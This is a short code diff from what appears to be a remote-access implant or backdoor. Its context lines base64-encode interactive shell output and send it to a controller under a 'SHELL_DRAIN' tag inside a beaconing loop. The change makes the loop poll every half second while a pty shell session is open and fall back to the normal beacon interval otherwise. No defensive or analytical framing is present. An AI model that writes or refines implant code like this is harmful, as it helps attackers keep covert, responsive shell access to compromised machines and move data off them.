@@ -419,4 +419,7 @@ if __name__ == "__main__":
             if out:
                 send_result("SHELL_DRAIN:" + base64.b64encode(out).decode())
 
-        time.sleep(BEACON_INTERVAL)
+        if _pty_fd is not None:
+            time.sleep(0.5)
+        else:
+            time.sleep(BEACON_INTERVAL)
